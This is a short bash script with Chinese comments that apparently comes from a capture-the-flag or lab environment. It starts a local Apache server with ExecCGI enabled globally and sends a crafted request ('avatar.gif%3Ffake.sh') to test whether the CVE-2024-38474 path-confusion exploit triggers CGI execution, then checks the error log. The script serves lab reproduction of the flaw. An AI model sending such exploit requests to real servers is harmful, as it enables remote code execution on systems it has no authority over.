#!/bin/bash
# 诊断：ExecCGI 是否因 <Directory> 合并问题而未生效
set -u
CONF="/tmp/cve-2024-38474/diag.conf"
RUN=/tmp/cve-2024-38474
sed 's#<Directory "/opt/httpd/lab/upload">#<Directory "/opt/httpd/lab/upload"><IfModule !core_module>#; s#</Directory>#</IfModule></Directory>#' \
  "/mnt/e/强网拟态/cve/apache/conf/CVE-2024-38474.conf" > /dev/null 2>&1 || true

# 直接用 awk 生成两个变体：A=原样；B=在 <Directory /> 全局加 ExecCGI
cp "/mnt/e/强网拟态/cve/apache/conf/CVE-2024-38474.conf" "$CONF"
sed -i 's#^<Directory />$#<Directory />\n    Options +ExecCGI#' "$CONF"
sed -i 's#Listen 8095#Listen 8096#; s#127.0.0.1:8095#127.0.0.1:8096#; s#/tmp/cve-2024-38474#/tmp/cve-2024-38474b#g' "$CONF"
mkdir -p /tmp/cve-2024-38474b
/opt/httpd/bin/httpd -t -f "$CONF" 2>&1
cd /opt/httpd
/opt/httpd/bin/httpd -f "$CONF" -DFOREGROUND > $RUN/diag_console.log 2>&1 &
HPID=$!
echo "pid=$HPID"
for i in $(seq 1 40); do curl -s -o /dev/null --max-time 1 http://127.0.0.1:8096/ && break; sleep 0.2; done
echo "--- mislead request with global ExecCGI ---"
curl -sS --path-as-is -w '\nHTTP=%{http_code}\n' "http://127.0.0.1:8096/get/avatar.gif%3Ffake.sh"
sleep 0.5
kill $HPID 2>/dev/null
sleep 0.5
kill -9 $HPID 2>/dev/null
echo "--- error log ---"
grep -a 'avatar.gif' /tmp/cve-2024-38474b/error_log | tail -8
